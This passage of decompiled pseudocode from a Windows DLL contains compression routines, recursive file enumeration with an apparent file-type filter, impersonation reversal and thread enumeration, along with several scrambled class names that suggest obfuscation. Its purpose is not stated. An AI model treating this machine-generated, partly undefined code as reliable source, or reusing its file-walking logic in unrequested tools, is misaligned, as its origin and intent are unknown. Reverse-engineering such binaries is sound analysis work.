      v25 = ++a1[27];
      a1[26] = 0;
      a1[24] = 2;
      if ( v36 )
      {
        v26 = a1[23];
        if ( v26 < 0 )
          v27 = 0;
        else
          v27 = (_BYTE *)(v26 + a1[14]);
        sub_10038D62(v25 - v26, (int)a1, 0, v27);
        a1[23] = a1[27];
        sub_1003172E(*a1);
LABEL_44:
        if ( !*(_DWORD *)(*a1 + 16) )
          return 0;
      }
    }
  }
  if ( a1[26] )
  {
    v32 = *(_BYTE *)(a1[27] + a1[14] - 1);
    *(_WORD *)(a1[1449] + 2 * a1[1448]) = 0;
    *(_BYTE *)(a1[1446] + a1[1448]++) = v32;
    ++LOWORD(a1[v32 + 37]);
    a1[26] = 0;
  }
  v33 = a1[23];
  if ( v33 < 0 )
    v34 = 0;
  else
    v34 = (_BYTE *)(v33 + a1[14]);
  sub_10038D62(a1[27] - v33, (int)a1, a2 == 4, v34);
  a1[23] = a1[27];
  sub_1003172E(*a1);
  if ( *(_DWORD *)(*a1 + 16) )
    return 2 * (a2 == 4) + 1;
  if ( a2 != 4 )
    return 0;
  return 2;
}

//----- (10032C53) --------------------------------------------------------
void __cdecl __noreturn sub_10032C53(int a1)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_10016788(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__);
}
// 10032C53: using guessed type _DWORD pExceptionObject[2];

//----- (10032C73) --------------------------------------------------------
_DWORD *__thiscall sub_10032C73(_DWORD *Block, char a2)
{
  sub_10032C92(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10032C92) --------------------------------------------------------
void __thiscall sub_10032C92(_DWORD *this)
{
  *this = &off_10094EC8;
  CoUninitialize();
}
// 10094EC8: using guessed type int (__thiscall *off_10094EC8)(void *Block, char);

//----- (10032CC2) --------------------------------------------------------
int __stdcall sub_10032CC2(int a1, int a2)
{
  int v3[10]; // [esp+0h] [ebp-28h] BYREF

  v3[6] = (int)v3;
  sub_1000CE26(v3, a2);
  v3[9] = -1;
  sub_1003A58D(0, (_DWORD *)a1, v3[0], v3[1]);
  *(_DWORD *)(a1 + 616) = -1;
  *(_DWORD *)a1 = &off_10094EFC;
  *(_BYTE *)(a1 + 621) = 0;
  *(_BYTE *)(a1 + 620) = 0;
  return a1;
}
// 10094EFC: using guessed type int (__thiscall *off_10094EFC)(void *Block, char);

//----- (10032D22) --------------------------------------------------------
void *__thiscall sub_10032D22(void *Block, char a2)
{
  sub_10032D41((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10032D41) --------------------------------------------------------
LONG __thiscall sub_10032D41(int this)
{
  *(_DWORD *)this = &off_10094EFC;
  if ( *(_DWORD *)(this + 616) != -1 )
    FindClose(*(HANDLE *)(this + 616));
  return sub_1003A5F2((int *)this);
}
// 10094EFC: using guessed type int (__thiscall *off_10094EFC)(void *Block, char);

//----- (10032D96) --------------------------------------------------------
void __thiscall sub_10032D96(int this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  struct _WIN32_FIND_DATAW *v5; // ebx
  HANDLE FirstFileW; // eax
  DWORD v7; // eax
  int *v8; // ecx
  bool v9; // bl
  DWORD LastError; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  bool v14; // bl
  int v15; // ecx
  int v16; // ecx
  void *v17; // ecx
  _DWORD *v18; // eax
  void *v19; // eax
  int v20; // ecx
  int v21; // ecx
  void *v22; // ecx
  _DWORD *v23; // eax
  volatile LONG *v24; // eax
  DWORD v25; // eax
  int v26; // [esp-34h] [ebp-368h] BYREF
  int v27; // [esp-30h] [ebp-364h] BYREF
  int v28; // [esp-2Ch] [ebp-360h] BYREF
  int v29; // [esp-28h] [ebp-35Ch] BYREF
  int v30; // [esp-24h] [ebp-358h]
  int *attributes; // [esp-20h] [ebp-354h]
  int *v32; // [esp-1Ch] [ebp-350h]
  int *v33; // [esp-18h] [ebp-34Ch]
  int v34; // [esp-14h] [ebp-348h]
  PMFN pmfnUnwind; // [esp-10h] [ebp-344h]
  int (__cdecl *pForwardCompat)(); // [esp-Ch] [ebp-340h]
  CatchableTypeArray *pCatchableTypeArray; // [esp-8h] [ebp-33Ch]
  _ThrowInfo *v38; // [esp-4h] [ebp-338h]
  int v39; // [esp+0h] [ebp-334h]
  int v40[14]; // [esp+10h] [ebp-324h] BYREF
  _DWORD v41[5]; // [esp+48h] [ebp-2ECh] BYREF
  _DWORD pExceptionObject[5]; // [esp+5Ch] [ebp-2D8h] BYREF
  _DWORD v43[5]; // [esp+70h] [ebp-2C4h] BYREF
  _DWORD v44[5]; // [esp+84h] [ebp-2B0h] BYREF
  int *v45; // [esp+98h] [ebp-29Ch]
  int v46; // [esp+9Ch] [ebp-298h] BYREF
  void *Block; // [esp+A0h] [ebp-294h]
  _DWORD *v48; // [esp+A4h] [ebp-290h]
  _DWORD v49[2]; // [esp+A8h] [ebp-28Ch] BYREF
  void *v50; // [esp+B0h] [ebp-284h]
  int v51; // [esp+B4h] [ebp-280h] BYREF
  int *v52; // [esp+B8h] [ebp-27Ch]
  int v53[2]; // [esp+BCh] [ebp-278h] BYREF
  int v54; // [esp+C4h] [ebp-270h] BYREF
  volatile LONG *lpAddend; // [esp+C8h] [ebp-26Ch]
  int v56; // [esp+CCh] [ebp-268h]
  _ThrowInfo v57; // [esp+D0h] [ebp-264h] BYREF
  _ThrowInfo *v58; // [esp+E0h] [ebp-254h]
  int *v59; // [esp+E4h] [ebp-250h]
  int v60; // [esp+E8h] [ebp-24Ch]
  int v61; // [esp+F0h] [ebp-244h]
  wchar_t v62[282]; // [esp+FCh] [ebp-238h] BYREF
  int v63; // [esp+330h] [ebp-4h]

  v50 = (void *)this;
  v48 = a2;
  v56 = 0;
  if ( *(_BYTE *)(this + 620) )
  {
    sub_1003348C(a2, 0);
    v63 = 0;
LABEL_3:
    v56 = 1;
    goto LABEL_4;
  }
  if ( *(_DWORD *)(this + 8) + *(_DWORD *)(this + 12) )
  {
    v5 = (struct _WIN32_FIND_DATAW *)(this + 24);
    if ( FindNextFileW(*(HANDLE *)(this + 616), (LPWIN32_FIND_DATAW)(this + 24)) )
      goto LABEL_16;
    LastError = GetLastError();
    if ( LastError != 18 )
    {
      SetLastError(LastError);
      sub_10039F4F(v41);
      v38 = (_ThrowInfo *)&_TI4_AVAoubmBglPnbiMzvxptraa_cah_sr__;
      v4 = v41;
      goto LABEL_8;
    }
    *(_BYTE *)(this + 620) = 1;
    sub_1003348C(a2, 0);
    v63 = 0;
    goto LABEL_3;
  }
  sub_1000CC20(&v51, asc_100B6B7C);
  v63 = 1;
  v3 = sub_1003A630(this, v53);
  LOBYTE(v63) = 2;
  sub_1000D027(&v54, (int)v3, (int)&v51);
  LOBYTE(v63) = 4;
  sub_1000CE59(v53);
  LOBYTE(v63) = 5;
  sub_1000CE59(&v51);
  if ( *((_DWORD *)lpAddend + 7) > 0x104u )
  {
    sub_10039F4F(pExceptionObject);
    v38 = (_ThrowInfo *)&_TI4_AVAoubmBglPnbiMzvxptraa_cah_sr__;
    v4 = pExceptionObject;
    goto LABEL_8;
  }
  v5 = (struct _WIN32_FIND_DATAW *)(this + 24);
  FirstFileW = FindFirstFileW(*((LPCWSTR *)lpAddend + 3), (LPWIN32_FIND_DATAW)(this + 24));
  *(_DWORD *)(this + 616) = FirstFileW;
  if ( FirstFileW == (HANDLE)-1 )
  {
    v7 = GetLastError();
    if ( v7 != 2 && v7 != 5 )
    {
      SetLastError(v7);
      sub_10039F4F(v44);
      v38 = (_ThrowInfo *)&_TI4_AVAoubmBglPnbiMzvxptraa_cah_sr__;
      v4 = v44;
      goto LABEL_8;
    }
    *(_BYTE *)(this + 620) = 1;
    sub_1003348C(a2, 0);
    v56 = 1;
    LOBYTE(v63) = 0;
    v8 = &v54;
  }
  else
  {
    LOBYTE(v63) = 0;
    sub_1000CE59(&v54);
LABEL_16:
    while ( !wcscmp((const wchar_t *)(this + 68), L".") || !wcscmp((const wchar_t *)(this + 68), L"..") )
    {
      if ( !FindNextFileW(*(HANDLE *)(this + 616), v5) )
      {
        v25 = GetLastError();
        if ( v25 == 18 )
        {
          *(_BYTE *)(this + 620) = 1;
          sub_1003348C(a2, 0);
          v63 = 0;
          v56 |= 1u;
          goto LABEL_4;
        }
        SetLastError(v25);
        sub_10039F4F(v43);
        v38 = (_ThrowInfo *)&_TI4_AVAoubmBglPnbiMzvxptraa_cah_sr__;
        v4 = v43;
LABEL_8:
        _CxxThrowException(v4, v38);
      }
    }
    v9 = (v5->dwFileAttributes & 0x10) != 0;
    LOBYTE(v45) = v9;
    if ( v9 )
      ++*(_DWORD *)(this + 12);
    else
      ++*(_DWORD *)(this + 8);
    sub_1000CC20(&v51, (wchar_t *)(this + 68));
    v63 = 6;
    sub_1000CC20(&v54, asc_100B6B94);
    LOBYTE(v63) = 7;
    v11 = sub_1003A630(this, &v46);
    LOBYTE(v63) = 8;
    v12 = sub_1000D027(v53, (int)v11, (int)&v54);
    LOBYTE(v63) = 9;
    sub_1000D027(v49, (int)v12, (int)&v51);
    LOBYTE(v63) = 11;
    sub_1000CE59(v53);
    LOBYTE(v63) = 12;
    sub_1000CE59(&v46);
    LOBYTE(v63) = 13;
    sub_1000CE59(&v54);
    LOBYTE(v63) = 14;
    sub_1000CE59(&v51);
    sub_1003A015(v40, (int)v49);
    LOBYTE(v63) = 15;
    v14 = 0;
    if ( *(_BYTE *)(this + 621) )
    {
      if ( !v9 )
      {
        v13 = sub_1003A4A8((int)v40, v53);
        LOBYTE(v63) = 16;
        v56 |= 2u;
        if ( sub_1000D84E((int)v13, (int)&unk_100BF7E4) )
          v14 = 1;
      }
    }
    v63 = 15;
    if ( (v56 & 2) != 0 )
    {
      v56 &= ~2u;
      sub_1000CE59(v53);
    }
    if ( v14 )
    {
      LOBYTE(v63) = 17;
      sub_10020FF4(v53, (int)v49, &v57);
      LOBYTE(v63) = 18;
      Block = operator new(0x38u);
      LOBYTE(v63) = 19;
      if ( Block )
      {
        v38 = v58;
        pCatchableTypeArray = v57.pCatchableTypeArray;
        pForwardCompat = v57.pForwardCompat;
        pmfnUnwind = v57.pmfnUnwind;
        v34 = v60;
        v33 = v59;
        v32 = (int *)((v57.attributes >> 4) & 0xFFFFFF01);
        attributes = (int *)v57.attributes;
        v30 = v61;
        v29 = v15;
        v28 = v15;
        v52 = &v28;
        sub_1000CE26(&v28, (int)v53);
        LOBYTE(v63) = 20;
        v27 = v16;
        v26 = v16;
        lpAddend = &v26;
        sub_1000CC20(&v26, v62);
        LOBYTE(v63) = 19;
        v18 = sub_1003A669(
                v17,
                Block,
                v26,
                v27,
                v28,
                v29,
                v30,
                attributes,
                v32,
                (int)v33,
                v34,
                (int)pmfnUnwind,
                (int)pForwardCompat,
                (int)pCatchableTypeArray,
                (int)v38);
      }
      else
      {
        v18 = 0;
      }
      LOBYTE(v63) = 18;
      sub_1003348C(a2, (int)v18);
      v56 |= 1u;
      LOBYTE(v63) = 17;
      sub_1000CE59(v53);
    }
    else
    {
      v19 = operator new(0x38u);
      v20 = v39;
      v50 = v19;
      LOBYTE(v63) = 23;
      if ( v19 )
      {
        v39 = *(_DWORD *)(this + 40);
        v38 = *(_ThrowInfo **)(this + 36);
        pCatchableTypeArray = *(CatchableTypeArray **)(this + 32);
        pForwardCompat = *(int (__cdecl **)())(this + 28);
        pmfnUnwind = *(PMFN *)(this + 48);
        v34 = *(_DWORD *)(this + 44);
        v33 = v45;
        v32 = *(int **)(this + 24);
        attributes = *(int **)(this + 56);
        v30 = v20;
        v29 = v20;
        lpAddend = &v29;
        sub_1000CE26(&v29, (int)v49);
        LOBYTE(v63) = 24;
        v28 = v21;
        v27 = v21;
        v52 = &v27;
        sub_1000CC20(&v27, (wchar_t *)(this + 68));
        LOBYTE(v63) = 23;
        v23 = sub_1003A669(
                v22,
                v50,
                v27,
                v28,
                v29,
                v30,
                (int)attributes,
                v32,
                v33,
                v34,
                (int)pmfnUnwind,
                (int)pForwardCompat,
                (int)pCatchableTypeArray,
                (int)v38,
                v39);
      }
      else
      {
        v23 = 0;
      }
      LOBYTE(v63) = 15;
      sub_1003348C(&v54, (int)v23);
      LOBYTE(v63) = 26;
      v24 = lpAddend;
      a2[1] = lpAddend;
      *a2 = v54;
      InterlockedIncrement(v24);
      v56 |= 1u;
      LOBYTE(v63) = 15;
      sub_10021CC1(&v54);
    }
    LOBYTE(v63) = 14;
    sub_1003A3A1(v40);
    LOBYTE(v63) = 0;
    v8 = v49;
  }
  sub_1000CE59(v8);
LABEL_4:
  sub_1006A5B6();
}
// 10033147: variable 'v15' is possibly undefined
// 10033162: variable 'v16' is possibly undefined
// 10033187: variable 'v17' is possibly undefined
// 1003323B: variable 'v21' is possibly undefined
// 1003325A: variable 'v22' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100B6B7C: using guessed type wchar_t asc_100B6B7C[5];
// 100B6B94: using guessed type wchar_t asc_100B6B94[2];
// 10032D96: using guessed type _DWORD pExceptionObject[5];
// 10032D96: using guessed type _DWORD var_2B0[5];
// 10032D96: using guessed type _DWORD var_2EC[5];
// 10032D96: using guessed type _DWORD var_28C[2];
// 10032D96: using guessed type int var_324[14];
// 10032D96: using guessed type wchar_t var_238[282];
// 10032D96: using guessed type _DWORD var_2C4[5];

//----- (10033309) --------------------------------------------------------
void __thiscall sub_10033309(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 4;
  sub_10039FBC(this + 4);
  sub_1001646C(v1);
}

//----- (1003331C) --------------------------------------------------------
_DWORD *__thiscall sub_1003331C(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  int v5; // eax

  if ( a3 )
  {
    this[1] = &unk_10094EEC;
    this[2] = &unk_10094EF4;
    if ( a2 )
      v4 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4) + a2 + 4;
    else
      v4 = 0;
    sub_10016406(this + 4, v4);
  }
  sub_100333B8(this, a2, 0);
  sub_1000CAAE(this + 2, a2 != 0 ? (_DWORD *)(a2 + 8) : 0, 0);
  v5 = this[1];
  *this = &off_10094EE0;
  *(_DWORD *)((char *)this + *(_DWORD *)(v5 + 4) + 4) = &off_10094EE4;
  return this;
}
// 10094EE0: using guessed type int (*off_10094EE0)();
// 10094EE4: using guessed type int (__stdcall *off_10094EE4)(char);

//----- (100333B8) --------------------------------------------------------
_DWORD *__thiscall sub_100333B8(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  int v5; // eax

  if ( a3 )
  {
    v4 = a2;
    this[1] = &unk_10094ED8;
    if ( a2 )
      v4 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4) + a2 + 4;
    sub_10016406(this + 2, v4);
  }
  v5 = this[1];
  *this = &off_10094ECC;
  *(_DWORD *)((char *)this + *(_DWORD *)(v5 + 4) + 4) = &off_10094ED0;
  return this;
}
// 10094ECC: using guessed type void (__noreturn *off_10094ECC)();
// 10094ED0: using guessed type int (__stdcall *off_10094ED0)(char);

//----- (10033421) --------------------------------------------------------
char *__thiscall sub_10033421(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 4);
  sub_10033309(this - 4);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10033443) --------------------------------------------------------
_DWORD *__thiscall sub_10033443(_DWORD *this, char a2)
{
  _DWORD *v2; // esi
  _DWORD *v3; // ecx

  v2 = this - 2;
  sub_10039F39(this);
  sub_1001646C(v3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}
// 10033452: variable 'v3' is possibly undefined

//----- (1003348C) --------------------------------------------------------
_DWORD *__userpurge sub_1003348C@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100334CB) --------------------------------------------------------
void __noreturn sub_100334CB()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_100167F9(pExceptionObject, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 100334CB: using guessed type void __noreturn sub_100334CB();
// 100334CB: using guessed type _DWORD pExceptionObject[3];

//----- (100334EA) --------------------------------------------------------
_DWORD *__thiscall sub_100334EA(_DWORD *Block, char a2)
{
  sub_10033509(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10033509) --------------------------------------------------------
BOOL __thiscall sub_10033509(_DWORD *this)
{
  BOOL result; // eax
  _DWORD pExceptionObject[7]; // [esp+10h] [ebp-1Ch] BYREF

  *this = off_10094F04;
  pExceptionObject[6] = 0;
  result = RevertToSelf();
  if ( !result )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 10094F04: using guessed type int (__thiscall *off_10094F04[2])(void *Block, char);

//----- (10033555) --------------------------------------------------------
int __userpurge sub_10033555@<eax>(int a1@<edi>, int a2, char a3, char a4, char a5)
{
  *(_DWORD *)(a2 + 8) = 0;
  *(_BYTE *)(a2 + 4) = a3;
  *(_BYTE *)(a2 + 5) = a4;
  *(_BYTE *)(a2 + 6) = a5;
  *(_DWORD *)a2 = &off_10094F08;
  *(_BYTE *)(a2 + 7) = 0;
  sub_1000FF31(a1, (_DWORD *)(a2 + 12));
  sub_100287F8(a2 + 24);
  sub_10033669(a2);
  return a2;
}
// 10094F08: using guessed type int (__thiscall *off_10094F08)(void *Block, char);

//----- (100335B2) --------------------------------------------------------
int *__thiscall sub_100335B2(int *Block, char a2)
{
  sub_100335D1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100335D1) --------------------------------------------------------
LONG __thiscall sub_100335D1(int *this)
{
  *this = (int)&off_10094F08;
  sub_10028854((int)(this + 6));
  return sub_10001FCC(this + 3);
}
// 10094F08: using guessed type int (__thiscall *off_10094F08)(void *Block, char);

//----- (10033610) --------------------------------------------------------
int __userpurge sub_10033610@<eax>(int a1@<esi>, int a2)
{
  _DWORD pExceptionObject[4]; // [esp+14h] [ebp-10h] BYREF

  pExceptionObject[3] = 0;
  if ( *(_BYTE *)(a1 + 7) )
  {
    sub_1001668F(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  sub_10028963(a2, a1 + 24);
  sub_10033669(a1);
  return a2;
}
// 10028963: using guessed type _DWORD __stdcall sub_10028963(_DWORD, _DWORD);

//----- (10033669) --------------------------------------------------------
void __stdcall sub_10033669(int a1)
{
  _DWORD *v1; // eax
  DWORD v2; // eax
  bool v3; // zf
  char v4[47]; // [esp+10h] [ebp-40h] BYREF
  char v5; // [esp+3Fh] [ebp-11h]
  int v6; // [esp+4Ch] [ebp-4h]

  v5 = 0;
  while ( !v5 )
  {
    v6 = 0;
    v1 = (_DWORD *)sub_10028754(*(_DWORD *)(a1 + 8), a1 + 12, (int)v4, 0);
    LOBYTE(v6) = 1;
    sub_100289BC(a1 + 24, v1);
    LOBYTE(v6) = 0;
    sub_10028854((int)v4);
    v2 = sub_10028A10(a1 + 24);
    switch ( v2 )
    {
      case 0x1000u:
        v3 = *(_BYTE *)(a1 + 4) == 0;
        break;
      case 0x2000u:
        v3 = *(_BYTE *)(a1 + 5) == 0;
        break;
      case 0x10000u:
        v3 = *(_BYTE *)(a1 + 6) == 0;
        break;
      default:
        goto LABEL_11;
    }
    if ( !v3 )
      v5 = 1;
LABEL_11:
    *(_DWORD *)(a1 + 8) += *(_DWORD *)(a1 + 60);
    v6 = -1;
  }
}

//----- (10033707) --------------------------------------------------------
_DWORD *__stdcall sub_10033707(_DWORD *a1, int a2)
{
  sub_1002F2CA((int)a1, a2, 0);
  *a1 = &off_10094F10;
  return a1;
}
// 10094F10: using guessed type int (__thiscall *off_10094F10)(void *Block, char);

//----- (10033739) --------------------------------------------------------
_BYTE *__thiscall sub_10033739(_BYTE *Block, char a2)
{
  sub_10033758(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10033758) --------------------------------------------------------
void __thiscall sub_10033758(_BYTE *this)
{
  *(_DWORD *)this = &off_10094F10;
  sub_1002F322(this);
}
// 10094F10: using guessed type int (__thiscall *off_10094F10)(void *Block, char);

//----- (1003377C) --------------------------------------------------------
void __thiscall sub_1003377C(void *this, int a2, unsigned int a3)
{
  unsigned int i; // esi
  _DWORD pExceptionObject[2]; // [esp+8h] [ebp-8h] BYREF

  for ( i = 0; i < a3; ++i )
  {
    if ( !(*(int (__thiscall **)(void *, unsigned int))(*(_DWORD *)this + 16))(this, i + a2) )
    {
      sub_1001CB1A(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__);
    }
  }
}
// 1003377C: using guessed type _DWORD pExceptionObject[2];

//----- (100337C1) --------------------------------------------------------
__int16 __thiscall sub_100337C1(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 64))(this, &v2, 2);
  return (__int16)v2;
}

//----- (100337D6) --------------------------------------------------------
int __thiscall sub_100337D6(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 64))(this, &v2, 4);
  return (int)v2;
}

//----- (100337EA) --------------------------------------------------------
_DWORD *__thiscall sub_100337EA(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // eax
  int v6[5]; // [esp+10h] [ebp-3Ch] BYREF
  int v7[5]; // [esp+24h] [ebp-28h] BYREF
  int v8; // [esp+38h] [ebp-14h]
  char v9[9]; // [esp+3Fh] [ebp-Dh] BYREF
  int v10; // [esp+48h] [ebp-4h]

  v8 = 0;
  sub_10016983(0, (int)v7, 0);
  v10 = 1;
  while ( 1 )
  {
    v4 = (*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 16))(this, v9);
    if ( !v9[0] || !v4 )
      break;
    v3 = (_DWORD *)sub_10016983((void *)1, (int)v6, v9);
    LOBYTE(v10) = 2;
    sub_10016CD5(v3, (int)v7);
    LOBYTE(v10) = 1;
    sub_10016B53(v6);
  }
  sub_1000CDFA(a2);
  v8 = 1;
  LOBYTE(v10) = 0;
  sub_10016B53(v7);
  return a2;
}
// 100337EA: using guessed type int var_28[5];
// 100337EA: using guessed type int var_3C[5];

//----- (10033871) --------------------------------------------------------
char sub_10033871()
{
  return 1;
}

//----- (10033885) --------------------------------------------------------
int sub_10033885()
{
  return 0;
}

//----- (10033888) --------------------------------------------------------
char sub_10033888()
{
  return 1;
}

//----- (1003388C) --------------------------------------------------------
int __thiscall sub_1003388C(_DWORD *this)
{
  return this[1];
}

//----- (10033890) --------------------------------------------------------
bool __thiscall sub_10033890(_DWORD *this)
{
  bool result; // al

  *this = &off_10094F68;
  result = sub_10014389(this + 2);
  *this = &off_10094F54;
  return result;
}
// 10094F54: using guessed type void (__noreturn *off_10094F54)();
// 10094F68: using guessed type int (__thiscall *off_10094F68)(void *Block, char);

//----- (100338C3) --------------------------------------------------------
_DWORD *__thiscall sub_100338C3(_DWORD *Block, char a2)
{
  sub_10033890(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100338E2) --------------------------------------------------------
_DWORD *__userpurge sub_100338E2@<eax>(int a1@<ebx>, _DWORD *a2)
{
  int v2; // eax
  DWORD v3; // eax
  int CurrentProcessId; // [esp-4h] [ebp-50h]
  _DWORD v6[14]; // [esp+10h] [ebp-3Ch] BYREF
  int v7; // [esp+48h] [ebp-4h]

  v2 = *(_DWORD *)(a1 + 4);
  *a2 = &off_10094F54;
  a2[1] = v2;
  v7 = 0;
  *a2 = &off_10094F68;
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10029136(a2 + 2, (void *)0xFFFFFFFF, 0, 0, v3, CurrentProcessId);
  LOBYTE(v7) = 1;
  sub_1003394B((int)v6, *(_DWORD *)(a1 + 4));
  LOBYTE(v7) = 1;
  sub_10033890(v6);
  return a2;
}
// 10094F54: using guessed type void (__noreturn *off_10094F54)();
// 10094F68: using guessed type int (__thiscall *off_10094F68)(void *Block, char);
// 100338E2: using guessed type _DWORD var_3C[14];

//----- (1003394B) --------------------------------------------------------
int __stdcall sub_1003394B(int a1, int a2)
{
  DWORD v2; // eax
  HANDLE Toolhelp32Snapshot; // eax
  DWORD v5; // [esp-8h] [ebp-30h]
  void *v6; // [esp-8h] [ebp-30h]
  int CurrentProcessId; // [esp-4h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-2Ch]
  _DWORD pExceptionObject[5]; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+24h] [ebp-4h]

  *(_DWORD *)a1 = &off_10094F54;
  *(_DWORD *)(a1 + 4) = a2;
  v10 = 0;
  *(_DWORD *)a1 = &off_10094F68;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10029136((_DWORD *)(a1 + 8), (void *)0xFFFFFFFF, 0, 0, v2, CurrentProcessId);
  LOBYTE(v10) = 1;
  *(_BYTE *)(a1 + 44) = 0;
  v8 = GetCurrentProcessId();
  v5 = GetCurrentProcessId();
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(4u, 0);
  sub_10015027((_DWORD *)(a1 + 8), Toolhelp32Snapshot, 0, 0, v5, v8);
  if ( *(_DWORD *)(a1 + 12) == -1 )
  {
LABEL_2:
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  memset((void *)(a1 + 16), 0, 0x1Cu);
  v6 = *(void **)(a1 + 12);
  *(_DWORD *)(a1 + 16) = 28;
  if ( Thread32First(v6, (LPTHREADENTRY32)(a1 + 16)) )
  {
    if ( *(_DWORD *)(a1 + 28) != *(_DWORD *)(a1 + 4) )
      sub_10033A1F(a1);
  }
  else
  {
    *(_BYTE *)(a1 + 44) = 1;
    if ( GetLastError() != 18 )
      goto LABEL_2;
  }
  return a1;
}
// 10094F54: using guessed type void (__noreturn *off_10094F54)();
// 10094F68: using guessed type int (__thiscall *off_10094F68)(void *Block, char);
// 1003394B: using guessed type _DWORD pExceptionObject[5];

//----- (10033A1B) --------------------------------------------------------
char __thiscall sub_10033A1B(_BYTE *this)
{
  return this[44];
}

//----- (10033A1F) --------------------------------------------------------
DWORD __thiscall sub_10033A1F(int this)
{
  _DWORD *v2; // edi
  DWORD result; // eax
  void *v4; // [esp-8h] [ebp-20h]
  _DWORD v5[3]; // [esp+8h] [ebp-10h] BYREF
  int pExceptionObject; // [esp+14h] [ebp-4h] BYREF

  if ( *(_BYTE *)(this + 44) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v2 = (_DWORD *)(this + 16);
  while ( 1 )
  {
    memset((void *)(this + 16), 0, 0x1Cu);
    v4 = *(void **)(this + 12);
    *v2 = 28;
    result = Thread32Next(v4, (LPTHREADENTRY32)(this + 16));
    if ( !result )
      break;
    if ( !*(_BYTE *)(this + 44) )
    {
      result = *(_DWORD *)(this + 28);
      if ( result != *(_DWORD *)(this + 4) )
        continue;
    }
    return result;
  }
  *(_BYTE *)(this + 44) = 1;
  result = GetLastError();
  if ( result != 18 )
  {
    sub_100167F9(v5, 1);
    _CxxThrowException(v5, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 10033A1F: using guessed type _DWORD var_10[3];

//----- (10033A9F) --------------------------------------------------------
int __thiscall sub_10033A9F(int this)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( *(_BYTE *)(this + 44) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return *(_DWORD *)(this + 24);
}

//----- (10033AC4) --------------------------------------------------------
_DWORD *__stdcall sub_10033AC4(int pExceptionObject, _DWORD *a2, DWORD a3)
{
  if ( *(_BYTE *)(pExceptionObject + 44) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_1000EC5D(*(_DWORD *)(pExceptionObject + 24), a2, a3);
  return a2;
}

//----- (10033B19) --------------------------------------------------------
int __usercall sub_10033B19@<eax>(int a1@<eax>, int a2@<esi>)
{
  *(_DWORD *)(a2 + 4) = 0;
  *(_DWORD *)a2 = off_10094F7C;
  *(_BYTE *)(a2 + 8) = 1;
  sub_10033CE7(a1, a2);
  return a2;
}
// 10094F7C: using guessed type int (__thiscall *off_10094F7C[2])(void *Block, char);

//----- (10033B31) --------------------------------------------------------
HLOCAL *__thiscall sub_10033B31(HLOCAL *Block, char a2)
{
  sub_10033B6E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10033B5E) --------------------------------------------------------
HLOCAL *__usercall sub_10033B5E@<eax>(HLOCAL *result@<eax>)
{
  if ( *((_BYTE *)result + 8) )
    return (HLOCAL *)LocalFree(result[1]);
